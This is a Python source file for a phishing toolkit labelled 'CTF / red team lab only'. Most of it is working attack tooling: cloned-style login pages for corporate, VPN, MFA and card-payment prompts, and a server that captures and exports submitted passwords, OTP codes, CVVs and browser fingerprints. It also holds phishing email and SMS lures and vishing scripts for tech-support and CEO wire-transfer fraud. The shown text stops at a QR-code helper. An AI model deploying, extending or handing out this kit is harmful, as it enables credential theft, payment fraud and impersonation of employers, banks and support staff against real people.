"""
Social Engineering Toolkit Pro (CTF / lab only).
Author: idqwixxa

⚠ Только для CTF / red team лабораторий с письменным разрешением.

Возможности:
    ─── Phishing pages ───
    - 15+ CTF-safe шаблонов (employee-portal / webmail / vpn / mfa /
      password-reset / sharepoint / delivery / invoice / docusign /
      zoom-invite / teams-call / payment-confirm / 2fa-bypass /
      wifi-portal / hr-policy)
    - Кастомный брендинг (logo, colors, footer)
    - Custom CSS/JS override
    - Preview в браузере
    - Тема: light/dark/corporate

    ─── Telemetry server ───
    - Расширенный захват: referer, JS fingerprint (screen/lang/tz/
      canvas/webgl), session_id (cookie), timestamp
    - Детект бота / VPN / proxy (по UA + IP)
    - Отсечение health-check запросов
    - Real-time вывод с цветом
    - Экспорт captured → JSON / CSV / HTML / Markdown
    - Findings → notes при захвате пароля

    ─── QR-codes ───
    - 10+ типов: URL / text / Wi-Fi / vCard / email / phone / geo /
      event / SMS / WhatsApp / Telegram / Bitcoin
    - Кастомные цвета / логотип в центре
    - Экспорт PNG / SVG / ASCII

    ─── Email / SMS / Voice templates ───
    - 15+ email-шаблонов (IT-helpdesk / password-reset / payroll /
      delivery / sharepoint / invoice / HR-policy / direct-message)
    - .eml генерация (RFC-822 совместимо)
    - Attachment simulation
    - 10+ SMS / WhatsApp-шаблонов
    - 5+ voice-скриптов (vishing)
    - SMTP-send helper (с .env SMTP_*)

    ─── Website cloning ───
    - HTML + CSS + JS + images + fonts + favicon
    - Inline styles extraction
    - Relative path rewriting
    - Base tag injection

    ─── URL obfuscation ───
    - 20+ техник: punycode / IDN / homograph / decimal IP / hex /
      octal / IPv6 / @-trick / backslash / trailing dot / case-shuffle
      / url-encode / null byte / shortener / subdomain swap / port
      swap / sub-domain @ trick / credentials in URL / unicode

    ─── Tracking ───
    - Tracking pixel (PNG/GIF/SVG/HTML)
    - Email-safe pixel (не блокируется Gmail)
    - Web beacon script
    - Honeypot form tokens

    ─── Интеграция ───
    - Findings → notes (захват пароля / submit с IP)
    - Notify (при захвате форм / новых visit)
    - Экспорт: JSON / HTML / Markdown / CSV
"""
import asyncio
import base64
import csv
import html as html_mod
import json
import os
import re
import socket
import string
import threading
import time
from dataclasses import dataclass, asdict, field
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, quote

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.panel import Panel

from core.config import REPORT_DIR, config
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PHISH_DIR = REPORT_DIR / "phishing"
PHISH_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class SEFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: SEFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["social-eng", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


def _notify(title: str, msg: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(title, msg, severity=severity)
    except Exception:
        pass


# ===========================================================================
# Phishing templates (15+)
# ===========================================================================

PHISH_TEMPLATES = {
    "employee-portal": {
        "title": "Employee Portal — Sign in",
        "fields": ["email", "password"],
        "submit_text": "Sign in",
        "subtitle": "Corporate sign-in required",
        "brand": "Employee Portal",
    },
    "webmail": {
        "title": "Webmail Login",
        "fields": ["username", "password"],
        "submit_text": "Log in",
        "subtitle": "Mail service authentication",
        "brand": "Webmail",
    },
    "vpn-access": {
        "title": "VPN Access",
        "fields": ["username", "password", "otp"],
        "submit_text": "Connect",
        "subtitle": "Secure remote access",
        "brand": "VPN Gateway",
    },
    "mfa-verify": {
        "title": "MFA Verification",
        "fields": ["code"],
        "submit_text": "Verify",
        "subtitle": "Two-factor authentication",
        "brand": "MFA",
    },
    "password-reset": {
        "title": "Reset your password",
        "fields": ["email"],
        "submit_text": "Send reset link",
        "subtitle": "Enter your email to continue",
        "brand": "Password Reset",
    },
    "sharepoint": {
        "title": "Document shared with you",
        "fields": ["email", "password"],
        "submit_text": "Open document",
        "subtitle": "You have a new shared file",
        "brand": "Document Portal",
    },
    "delivery-notify": {
        "title": "Delivery notification",
        "fields": ["email", "password"],
        "submit_text": "Track package",
        "subtitle": "Your parcel is waiting",
        "brand": "Courier",
    },
    "invoice-view": {
        "title": "Invoice #INV-2024-001",
        "fields": ["email", "password"],
        "submit_text": "View invoice",
        "subtitle": "Payment confirmation required",
        "brand": "Billing",
    },
    "docusign": {
        "title": "Please review and sign",
        "fields": ["email", "password"],
        "submit_text": "Access Document",
        "subtitle": "A document is awaiting your signature",
        "brand": "eSign",
    },
    "zoom-invite": {
        "title": "Meeting invitation",
        "fields": ["email", "password"],
        "submit_text": "Join meeting",
        "subtitle": "You have been invited to a meeting",
        "brand": "Meetings",
    },
    "teams-call": {
        "title": "Missed call notification",
        "fields": ["email", "password"],
        "submit_text": "Open in browser",
        "subtitle": "You missed a call from your team",
        "brand": "Chat",
    },
    "payment-confirm": {
        "title": "Confirm your payment",
        "fields": ["card_number", "expiry", "cvv"],
        "submit_text": "Confirm payment",
        "subtitle": "One-step verification required",
        "brand": "Payments",
    },
    "2fa-bypass": {
        "title": "Verify it's really you",
        "fields": ["code"],
        "submit_text": "Verify",
        "subtitle": "We need to confirm your identity",
        "brand": "Security",
    },
    "wifi-portal": {
        "title": "Guest Wi-Fi Access",
        "fields": ["email", "password"],
        "submit_text": "Connect",
        "subtitle": "Sign in to access the internet",
        "brand": "Guest Wi-Fi",
    },
    "hr-policy": {
        "title": "Updated HR Policy",
        "fields": ["email", "password"],
        "submit_text": "Acknowledge policy",
        "subtitle": "You must review the new policy",
        "brand": "HR",
    },
}


# ===========================================================================
# Email templates (15+)
# ===========================================================================

EMAIL_TEMPLATES = {
    "it-helpdesk": {
        "subject": "IT: Password expires today",
        "body": """Hi {name},

Your corporate password expires at the end of today. To avoid losing
access, please update it now via the self-service portal:

{link}

If you don't reset it, your account will be locked and IT will need to
intervene manually.

Regards,
IT Helpdesk
""",
    },
    "password-reset": {
        "subject": "Reset your password",
        "body": """Hello {name},

We received a request to reset your password. If this was you, click:

{link}

Link expires in 1 hour. If you didn't request it, ignore this email.

Security Team
""",
    },
    "payroll": {
        "subject": "Payroll update — action required",
        "body": """Hi {name},

Your salary will be updated next month. Please verify your bank
details via the secure portal:

{link}

Deadline: 24 hours.

HR Department
""",
    },
    "delivery": {
        "subject": "Your parcel could not be delivered",
        "body": """Dear {name},

Our courier tried to deliver your parcel but nobody was home. To
reschedule, please confirm your address:

{link}

Tracking: {tracking}

Courier Service
""",
    },
    "sharepoint": {
        "subject": "{sender} shared a document with you",
        "body": """Hi {name},

{sender} ({email}) shared "{doc_name}" with you via the corporate
document portal:

{link}

This link will expire in 7 days.

Document Portal
""",
    },
    "invoice": {
        "subject": "Invoice #{invoice_id} is overdue",
        "body": """Hello {name},

Invoice #{invoice_id} in the amount of ${amount} has not been paid.
Please review and complete payment at:

{link}

Late fees will be applied after 7 days.

Billing Department
""",
    },
    "hr-policy": {
        "subject": "Mandatory: Updated HR Policy",
        "body": """Dear {name},

Please review and acknowledge the updated HR policy by the end of the
week. Access the document at:

{link}

Non-compliance will be escalated.

HR Department
""",
    },
    "mfa-notification": {
        "subject": "New sign-in from unrecognized device",
        "body": """Hi {name},

We detected a sign-in to your account from an unrecognized device:

Device: Unknown
Location: Unknown
Time: {timestamp}

If this wasn't you, secure your account immediately:

{link}

Security Team
""",
    },
    "voicemail": {
        "subject": "You have a new voicemail",
        "body": """Hi {name},

You have a new voicemail from an unknown caller. Listen to it here:

{link}

Voicemail Service
""",
    },
    "shared-folder": {
        "subject": "A folder was shared with you",
        "body": """Hello {name},

{sender} ({email}) shared the folder "{doc_name}" with you. Open it at:

{link}

Cloud Drive
""",
    },
    "calendar-invite": {
        "subject": "Invitation: Team sync",
        "body": """Hi {name},

You're invited to "Team Sync" on {timestamp}.

Join via:

{link}

Calendar
""",
    },
    "meeting-notes": {
        "subject": "Meeting notes for yesterday",
        "body": """Hi {name},

The meeting notes from yesterday's call are attached. You can also
access them online:

{link}

Regards
""",
    },
    "verification-code": {
        "subject": "Your verification code",
        "body": """Hi {name},

Your verification code is: 482913

To complete your login, enter the code at:

{link}

This code expires in 10 minutes.

Security
""",
    },
    "bank-alert": {
        "subject": "Unusual activity on your account",
        "body": """Dear {name},

We've noticed unusual activity on your account. Please verify recent
transactions at:

{link}

If you don't recognize these, secure your account immediately.

Fraud Prevention
""",
    },
    "subscription-renewal": {
        "subject": "Your subscription will renew soon",
        "body": """Hi {name},

Your subscription is due for renewal on {timestamp}. To update your
payment method, please visit:

{link}

Billing
""",
    },
    "ceo-request": {
        "subject": "Quick request",
        "body": """Hi {name},

I need a small favor from you. Please check the link below when you
have a moment. It's urgent.

{link}

Thanks,
{name_ceo}
""",
    },
}


# ===========================================================================
# SMS / WhatsApp templates (10+)
# ===========================================================================

SMS_TEMPLATES = {
    "bank": "ALERT: Suspicious login detected on your account. Verify now: {link}",
    "delivery": "Your parcel is held. Confirm address: {link}",
    "mfa": "Your verification code: 482913. Do not share. If this wasn't you: {link}",
    "payroll": "HR: Update your payroll info today or salary will be delayed. {link}",
    "ceo": "Hi, this is {name}, need a quick favor. Reply ASAP — {link}",
    "tax": "Your tax refund is ready: {link}",
    "insurance": "Your insurance claim is pending approval: {link}",
    "password": "Password reset requested. If this wasn't you, cancel here: {link}",
    "whatsapp-verify": "WhatsApp: Verify your new device — {link}",
    "job-offer": "We reviewed your CV. Download offer: {link}",
    "lottery": "Congratulations! You won ${amount}. Claim: {link}",
}


# ===========================================================================
# Voice (vishing) scripts
# ===========================================================================

VOICE_SCRIPTS = {
    "it-helpdesk": [
        ("Opening", "Hi, this is Mike from the IT Helpdesk. "
                    "We've detected unusual sign-in attempts on your account."),
        ("Urgency", "To prevent your account from being locked, we need to "
                    "verify your identity right now."),
        ("Ask", "Please confirm your username and the one-time code you just "
                "received by SMS."),
        ("Close", "Thank you. Your account is now secure. "
                  "If anything else happens — call back."),
    ],
    "hr-payroll": [
        ("Opening", "Hi, this is Sarah from HR. We're updating payroll "
                    "for the new quarter."),
        ("Ask", "I need to confirm your bank account number and routing "
                "to make sure the payment goes through."),
        ("Objection", "I understand — this is standard procedure. "
                      "You can verify by calling the official HR line."),
        ("Close", "Got it. The update is queued for tomorrow. "
                  "Have a nice day."),
    ],
    "bank-fraud": [
        ("Opening", "Hello, I'm calling from the Fraud Prevention team. "
                    "We blocked a suspicious purchase on your card."),
        ("Ask", "To re-enable your card I need to verify the last 4 digits, "
                "expiration date, and the CVV."),
        ("Objection", "If you'd prefer, I can transfer you — "
                      "but first let me confirm your identity."),
        ("Close", "Thank you for your time. Your card is now unblocked."),
    ],
    "tech-support": [
        ("Opening", "Hi, this is Microsoft Support. Your computer is "
                    "reporting critical errors."),
        ("Ask", "Please install AnyDesk so we can diagnose the issue. "
                "It's free and safe."),
        ("Objection", "I understand your concern — we do this every day. "
                      "You can hang up and call back on the official line."),
        ("Close", "Perfect. We're connecting now."),
    ],
    "ceo-fraud": [
        ("Opening", "Hi, this is the CEO. I have a confidential request."),
        ("Ask", "I need you to process an urgent wire transfer — "
                "we're in the middle of an acquisition. Details by email."),
        ("Urgency", "Do not discuss with anyone else. "
                    "This is a confidential M&A matter."),
        ("Close", "Thanks, I'll send the SWIFT details in a moment."),
    ],
}


# ===========================================================================
# Phishing page HTML
# ===========================================================================

PHISH_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
  * {{ box-sizing: border-box; }}
  body {{
    font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
    background: {bg}; margin: 0; min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
  }}
  .card {{
    background: {card}; border-radius: 8px; padding: 36px 32px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); width: 100%;
    max-width: 380px;
  }}
  h1 {{ font-size: 22px; margin: 0 0 6px; color: {fg}; }}
  .sub {{ color: {fg_dim}; font-size: 13px; margin-bottom: 24px; }}
  .brand {{ color: {brand}; font-weight: 700; font-size: 12px;
            letter-spacing: 1.5px; text-transform: uppercase;
            margin-bottom: 8px; }}
  label {{ display: block; font-size: 12px; color: {fg_dim};
           margin-bottom: 6px; font-weight: 600; }}
  input {{
    width: 100%; padding: 10px 12px; border: 1px solid {border};
    border-radius: 6px; font-size: 14px; margin-bottom: 14px;
    background: {card}; color: {fg};
    transition: border-color .15s;
  }}
  input:focus {{ outline: none; border-color: {brand}; }}
  button {{
    width: 100%; padding: 11px; background: {brand}; color: #fff;
    border: none; border-radius: 6px; font-size: 14px; font-weight: 600;
    cursor: pointer; margin-top: 4px;
  }}
  button:hover {{ filter: brightness(0.9); }}
  .foot {{ text-align: center; color: {fg_dim}; font-size: 11px;
           margin-top: 20px; }}
</style>
</head>
<body>
<form class="card" method="POST" action="/submit">
  <div class="brand">{brand}</div>
  <h1>{title}</h1>
  <div class="sub">{subtitle}</div>
  {fields}
  <button type="submit">{submit_text}</button>
  <div class="foot">Secure connection</div>
</form>
<script>
  fetch('/pixel', {{
    method: 'POST',
    body: JSON.stringify({{
      referer: document.referrer,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: screen.width + 'x' + screen.height,
      lang: navigator.language,
      ua: navigator.userAgent,
      ts: new Date().toISOString()
    }})
  }}).catch(() => {{}});
</script>
</body>
</html>
"""


THEMES = {
    "light":     {"bg": "#f4f6f8", "card": "#ffffff", "fg": "#1a1a1a",
                  "fg_dim": "#666", "border": "#d0d5dc", "brand": "#0066cc"},
    "dark":      {"bg": "#0f0f0f", "card": "#1a1a1a", "fg": "#f0f0f0",
                  "fg_dim": "#999", "border": "#333", "brand": "#3b82f6"},
    "corporate": {"bg": "#eef2f7", "card": "#ffffff", "fg": "#1e293b",
                  "fg_dim": "#64748b", "border": "#cbd5e1",
                  "brand": "#0f172a"},
}


def _render_field(name: str) -> str:
    label = name.replace("_", " ").title()
    input_type = {
        "password": "password",
        "otp": "text",
        "code": "text",
        "email": "email",
        "card_number": "text",
        "expiry": "text",
        "cvv": "password",
    }.get(name, "text")
    maxlen = ""
    if name in ("otp", "code"):
        maxlen = ' maxlength="6" inputmode="numeric"'
    elif name == "card_number":
        maxlen = ' maxlength="19" inputmode="numeric" autocomplete="cc-number"'
    elif name == "expiry":
        maxlen = ' maxlength="5" inputmode="numeric" autocomplete="cc-exp"'
    elif name == "cvv":
        maxlen = ' maxlength="4" inputmode="numeric" autocomplete="cc-csc"'
    return (
        f'<label for="{name}">{label}</label>\n'
        f'<input type="{input_type}" name="{name}" id="{name}" '
        f'autocomplete="off"{maxlen} required>'
    )


def _render_phish_html(template: str, theme: str = "light",
                       custom_css: str = "",
                       custom_js: str = "") -> str:
    tpl = PHISH_TEMPLATES.get(template, PHISH_TEMPLATES["employee-portal"])
    theme_vars = dict(THEMES.get(theme, THEMES["light"]))
    theme_vars["brand"] = tpl.get("brand_color") or theme_vars["brand"]

    fields_html = "\n  ".join(_render_field(f) for f in tpl["fields"])
    html_str = PHISH_HTML_TEMPLATE.format(
        title=html_mod.escape(tpl["title"]),
        subtitle=html_mod.escape(tpl["subtitle"]),
        brand=html_mod.escape(tpl.get("brand", "")),
        fields=fields_html,
        submit_text=html_mod.escape(tpl["submit_text"]),
        **theme_vars,
    )
    if custom_css:
        html_str = html_str.replace(
            "</style>", f"\n{custom_css}\n</style>")
    if custom_js:
        html_str = html_str.replace(
            "</body>", f"\n<script>{custom_js}</script>\n</body>")
    return html_str


# ===========================================================================
# Telemetry event
# ===========================================================================

@dataclass
class CaptureEvent:
    ts: str
    kind: str          # visit | submit | pixel | bot
    ip: str
    ua: str
    path: str
    referer: str = ""
    session_id: str = ""
    data: dict = field(default_factory=dict)


class PhishServer:
    """HTTP-сервер для фишинг-страницы + телеметрии."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8000,
                 template: str = "employee-portal",
                 redirect_url: str = "https://example.com",
                 theme: str = "light",
                 custom_css: str = "",
                 custom_js: str = "") -> None:
        self.host = host
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.theme = theme
        self.custom_css = custom_css
        self.custom_js = custom_js
        self.events: list[CaptureEvent] = []
        self.captured: list[dict] = []
        self._stop = asyncio.Event()
        self._server: asyncio.AbstractServer | None = None

    def _page(self) -> bytes:
        html_str = _render_phish_html(self.template, self.theme,
                                       self.custom_css, self.custom_js)
        return html_str.encode("utf-8")

    async def _handle(self, reader: asyncio.StreamReader,
                      writer: asyncio.StreamWriter) -> None:
        try:
            raw = b""
            while b"\r\n\r\n" not in raw:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
                if not chunk:
                    return
                raw += chunk
                if len(raw) > 128 * 1024:
                    break

            head, _, body = raw.partition(b"\r\n\r\n")
            lines = head.decode("iso-8859-1", errors="ignore").split("\r\n")
            if not lines:
                return
            method, path, _ = (lines[0] + " / HTTP/1.1").split(" ", 2)[:3]

            headers: dict[str, str] = {}
            for line in lines[1:]:
                if ":" in line:
                    k, _, v = line.partition(":")
                    headers[k.strip().lower()] = v.strip()

            cl = int(headers.get("content-length", "0") or 0)
            if cl > 0:
                while len(body) < cl:
                    chunk = await asyncio.wait_for(reader.read(4096),
                                                     timeout=10)
                    if not chunk:
                        break
                    body += chunk

            ip = writer.get_extra_info("peername")
            ip_str = ip[0] if ip else "?"
            ua = headers.get("user-agent", "")
            referer = headers.get("referer", "")

            # Session cookie
            cookie = headers.get("cookie", "")
            sid = ""
            m = re.search(r"session_id=([a-zA-Z0-9._-]+)", cookie)
            if m:
                sid = m.group(1)

            # Отсечь health-check / favicon
            if path in ("/favicon.ico", "/robots.txt"):
                await self._respond(writer, 404, "text/plain", b"")
                return

            # Детект бота (эвристика)
            bot_hint = ""
            if not ua or re.search(r"(?i)bot|crawler|spider|monitor",
                                     ua):
                bot_hint = "bot"

            if path == "/" and method == "GET":
                if not sid:
                    sid = base64.urlsafe_b64encode(os.urandom(12)).decode(
                        ).rstrip("=")
                    # Set cookie + serve
                    body_bytes = self._page()
                    out = (
                        f"HTTP/1.1 200 OK\r\n"
                        f"Content-Type: text/html; charset=utf-8\r\n"
                        f"Set-Cookie: session_id={sid}; Path=/; HttpOnly\r\n"
                        f"Content-Length: {len(body_bytes)}\r\n"
                        f"Connection: close\r\n\r\n"
                    ).encode() + body_bytes
                    writer.write(out)
                    await writer.drain()
                else:
                    await self._respond(writer, 200, "text/html; charset=utf-8",
                                        self._page())
                self._log_event("visit", ip_str, ua, path, referer, sid,
                                {"bot_hint": bot_hint})

            elif path == "/submit" and method == "POST":
                data = self._parse_body(headers, body)
                safe_data = dict(data)
                if "password" in safe_data:
                    safe_data["password"] = "*" * len(safe_data["password"])
                if "cvv" in safe_data:
                    safe_data["cvv"] = "***"
                console.print(
                    f"[bold green]🎣 CAPTURED[/bold green] "
                    f"[dim]{ip_str}[/dim] "
                    f"[cyan]{json.dumps(safe_data, ensure_ascii=False)}"
                    f"[/cyan]"
                )
                self._log_event("submit", ip_str, ua, path, referer, sid,
                                data)
                self.captured.append({
                    "ts": datetime.now().isoformat(),
                    "ip": ip_str, "ua": ua, "referer": referer,
                    "session_id": sid, "data": data,
                })
                db.save_scan("phish_capture", self.template,
                             {"ip": ip_str, "data": data, "ua": ua[:200],
                              "session": sid})

                # Findings при захвате пароля
                if any(k in data for k in ("password", "cvv", "otp", "code")):
                    _save_finding(SEFinding(
                        kind="credential_captured",
                        severity="critical",
                        title=f"Credentials захвачены ({self.template})",
                        target=ip_str,
                        evidence=json.dumps(safe_data, ensure_ascii=False),
                        data={"template": self.template, "ip": ip_str},
                    ))
                    _notify(
                        f"🎣 Credential captured ({self.template})",
                        f"IP: {ip_str}\nUA: {ua[:80]}\n"
                        f"Data: {json.dumps(safe_data, ensure_ascii=False)}",
                        severity="critical",
                    )

                resp = (
                    f"HTTP/1.1 302 Found\r\n"
                    f"Location: {self.redirect_url}\r\n"
                    f"Content-Length: 0\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode()
                writer.write(resp)
                await writer.drain()

            elif path == "/pixel" and method == "POST":
                try:
                    px = json.loads(body.decode("utf-8", errors="ignore"))
                except Exception:
                    px = {"raw": body.decode("utf-8", errors="ignore")[:200]}
                self._log_event("pixel", ip_str, ua, path, referer, sid, px)

            else:
                await self._respond(writer, 404, "text/plain", b"not found")

        except Exception as exc:
            log.debug("phish handler: %s", exc)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    @staticmethod
    async def _respond(writer: asyncio.StreamWriter, code: int,
                       ctype: str, body: bytes) -> None:
        reason = {200: "OK", 302: "Found", 404: "Not Found"}.get(code, "OK")
        out = (
            f"HTTP/1.1 {code} {reason}\r\n"
            f"Content-Type: {ctype}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        writer.write(out)
        writer.write(body)
        await writer.drain()

    @staticmethod
    def _parse_body(headers: dict, body: bytes) -> dict:
        ctype = headers.get("content-type", "")
        text = body.decode("utf-8", errors="ignore")
        if "application/json" in ctype:
            try:
                return json.loads(text)
            except Exception:
                return {"raw": text[:500]}
        out = {}
        for pair in text.split("&"):
            if "=" in pair:
                k, _, v = pair.partition("=")
                from urllib.parse import unquote_plus
                out[unquote_plus(k)] = unquote_plus(v)
        return out

    def _log_event(self, kind: str, ip: str, ua: str,
                   path: str, referer: str, sid: str,
                   data: dict) -> None:
        ev = CaptureEvent(
            ts=datetime.now().isoformat(timespec="seconds"),
            kind=kind, ip=ip, ua=ua, path=path,
            referer=referer, session_id=sid, data=data or {},
        )
        self.events.append(ev)
        flag = {
            "visit": "[cyan]👁  visit [/cyan]",
            "submit": "[bold green]🎣 SUBMIT[/bold green]",
            "pixel": "[dim]·  pixel [/dim]",
            "bot": "[yellow]🤖 bot  [/yellow]",
        }.get(kind, f"[{kind}]")
        sid_short = (sid[:8] + "…") if len(sid) > 8 else sid
        console.print(f"{flag} [white]{ip:<16}[/white] "
                      f"[dim]sid={sid_short:<10} {path}[/dim]")
        # Console пишет логи — в БД
        db.save_scan("phish_event", f"{kind}:{self.template}",
                     asdict(ev))

    async def run(self) -> None:
        self._stop = asyncio.Event()
        self._server = await asyncio.start_server(
            self._handle, self.host, self.port,
        )
        addrs = ", ".join(str(s.getsockname()) for s in self._server.sockets)
        console.print(f"[green]✓ Phishing server: {addrs}[/green]")
        console.print(f"[cyan]  Template: {self.template} "
                      f"(theme={self.theme})[/cyan]")
        console.print(f"[cyan]  Redirect: {self.redirect_url}[/cyan]")
        console.print("[yellow]  Ctrl+C для остановки.[/yellow]")
        async with self._server:
            await self._stop.wait()

    async def stop(self) -> None:
        self._stop.set()
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:
                pass


def run_phish_server(port: int = 8000, template: str = "employee-portal",
                     redirect_url: str = "https://example.com",
                     theme: str = "light") -> None:
    srv = PhishServer(port=port, template=template,
                      redirect_url=redirect_url, theme=theme)
    try:
        asyncio.run(srv.run())
    except KeyboardInterrupt:
        console.print("\n[yellow]Сервер остановлен.[/yellow]")
        try:
            asyncio.run(srv.stop())
        except Exception:
            pass
    finally:
        if srv.captured:
            console.print(f"\n[bold cyan]🎣 Захвачено форм: "
                          f"{len(srv.captured)}[/bold cyan]")
            for i, c in enumerate(srv.captured, 1):
                console.print(f"  [green]{i}.[/green] [{c['ts']}] "
                              f"{c['ip']} → "
                              f"{json.dumps(c['data'], ensure_ascii=False)}")
            # Экспорт
            if Confirm.ask("Экспортировать captures?", default=False):
                export_captures(srv.captured, "html")
                export_captures(srv.captured, "json")


# ===========================================================================
# Generate phish page
# ===========================================================================

def generate_phish_page(template: str, out_path: str | None = None,
                         theme: str = "light",
                         custom_css: str = "",
                         custom_js: str = "") -> Path | None:
    if template not in PHISH_TEMPLATES:
        console.print(f"[red]Шаблон '{template}' не найден.[/red]")
        console.print(f"[dim]Доступно: {', '.join(PHISH_TEMPLATES.keys())}"
                      f"[/dim]")
        return None
    html_str = _render_phish_html(template, theme, custom_css, custom_js)
    if not out_path:
        out_path = str(PHISH_DIR / f"phish_{template}_{theme}.html")
    try:
        Path(out_path).write_text(html_str, encoding="utf-8")
        console.print(f"[green]✓ Страница: {out_path}[/green]")
        db.save_scan("phish_gen", template,
                     {"path": out_path, "theme": theme})
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def list_templates() -> None:
    table = Table(title=f"🎣 Обезличенные шаблоны ({len(PHISH_TEMPLATES)})")
    table.add_column("Slug", style="cyan", max_width=22)
    table.add_column("Title", style="white", max_width=35)
    table.add_column("Поля", style="green", max_width=35)
    for slug, tpl in PHISH_TEMPLATES.items():
        table.add_row(slug, tpl["title"], ", ".join(tpl["fields"]))
    console.print(table)

    t2 = Table(title=f"📧 Email-шаблоны ({len(EMAIL_TEMPLATES)})")
    t2.add_column("Slug", style="cyan", max_width=24)
    t2.add_column("Subject", style="white", max_width=50)
    for slug, tpl in EMAIL_TEMPLATES.items():
        t2.add_row(slug, tpl["subject"])
    console.print(t2)

    t3 = Table(title=f"📱 SMS-шаблоны ({len(SMS_TEMPLATES)})")
    t3.add_column("Slug", style="cyan", width=20)
    t3.add_column("Text", style="white", max_width=60)
    for slug, txt in SMS_TEMPLATES.items():
        t3.add_row(slug, txt)
    console.print(t3)

    t4 = Table(title=f"☎ Voice-скрипты ({len(VOICE_SCRIPTS)})")
    t4.add_column("Slug", style="cyan", width=20)
    t4.add_column("Этапов", style="green", width=8)
    for slug, steps in VOICE_SCRIPTS.items():
        t4.add_row(slug, str(len(steps)))
    console.print(t4)


# ===========================================================================
# Export captures
# ===========================================================================

def export_captures(captured: list[dict], fmt: str = "json",
                    out_path: str | None = None) -> Path | None:
    if not captured:
        console.print("[yellow]Нет captures.[/yellow]")
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"json": ".json", "csv": ".csv",
           "md": ".md", "html": ".html"}.get(fmt, ".json")
    if not out_path:
        out_path = str(PHISH_DIR / f"captures_{ts}{ext}")
    p = Path(out_path)

    try:
        if fmt == "json":
            p.write_text(
                json.dumps(captured, indent=2, ensure_ascii=False,
                            default=str),
                encoding="utf-8")
        elif fmt == "csv":
            with p.open("w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["ts", "ip", "ua", "referer", "session_id",
                            "data"])
                for c in captured:
                    w.writerow([
                        c.get("ts", ""),
                        c.get("ip", ""),
                        c.get("ua", "")[:120],
                        c.get("referer", ""),
                        c.get("session_id", ""),
                        json.dumps(c.get("data", {}),
                                    ensure_ascii=False),
                    ])
        elif fmt == "md":
            lines = [
                "# Phishing — Captured forms",
                f"_Generated: {datetime.now().isoformat()}_", "",
                f"Total: **{len(captured)}**", "",
                "| # | Time | IP | Referer | Data |",
                "|---|------|----|---------|------|",
            ]
            for i, c in enumerate(captured, 1):
                data = json.dumps(c.get("data", {}), ensure_ascii=False)
                lines.append(
                    f"| {i} | {c.get('ts', '')[:19]} | "
                    f"{c.get('ip', '')} | "
                    f"{(c.get('referer', '') or '—')[:50]} | "
                    f"`{data[:80]}` |")
            p.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html lang='ru'><head>"
                "<meta charset='utf-8'>",
                "<title>Phishing captures</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
                "padding:24px;line-height:1.5;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;margin-top:12px;"
                "font-size:13px;}",
                "th{background:#111;color:#00ff9c;padding:6px;text-align:left;"
                "border:1px solid #222;}",
                "td{padding:6px 8px;border:1px solid #222;"
                "word-break:break-all;}",
                "tr:nth-child(even){background:#0d0d0d;}",
                ".cred{color:#ff2020;font-weight:bold;}",
                "</style></head><body>",
                f"<h1>🎣 Captured forms ({len(captured)})</h1>",
                f"<p>Generated: "
                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
                "<table><tr><th>#</th><th>Time</th><th>IP</th>"
                "<th>UA</th><th>Referer</th><th>Data</th></tr>",
            ]
            for i, c in enumerate(captured, 1):
                data = json.dumps(c.get("data", {}), ensure_ascii=False)
                parts.append(
                    f"<tr><td>{i}</td>"
                    f"<td>{html_mod.escape(c.get('ts', '')[:19])}</td>"
                    f"<td>{html_mod.escape(c.get('ip', ''))}</td>"
                    f"<td>{html_mod.escape(c.get('ua', '')[:60])}</td>"
                    f"<td>{html_mod.escape(c.get('referer', '')[:60])}</td>"
                    f"<td class='cred'>{html_mod.escape(data[:200])}</td>"
                    f"</tr>")
            parts.append("</table></body></html>")
            p.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {p}[/green]")
        return p
    except Exception as exc:
        console.print(f"[red]Ошибка экспорта: {exc}[/red]")
        return None


# ===========================================================================
# QR-codes
# ===========================================================================

def _qrcode_available() -> bool:
    try:
        import qrcode  # noqa: F401
        return True
    except ImportError:
        return False


